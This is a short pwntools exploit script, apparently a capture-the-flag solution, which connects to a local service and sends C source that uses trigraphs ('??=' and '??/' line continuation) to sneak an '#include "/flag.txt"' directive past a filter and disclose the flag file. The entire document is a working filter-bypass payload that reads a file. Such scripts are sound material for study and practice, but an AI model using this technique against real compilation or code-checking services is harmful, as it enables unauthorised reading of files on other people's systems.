from pwn import *
context.binary = exe = ELF('./main')
context.terminal = ['tmux', 'splitw', '-h']

gdbscript = """
c
"""

#io = process(exe.path)
io = remote('127.0.0.1', 50000)

io.sendline(b'??=in??/\nclude "/flag.txt"\n')

io.interactive()
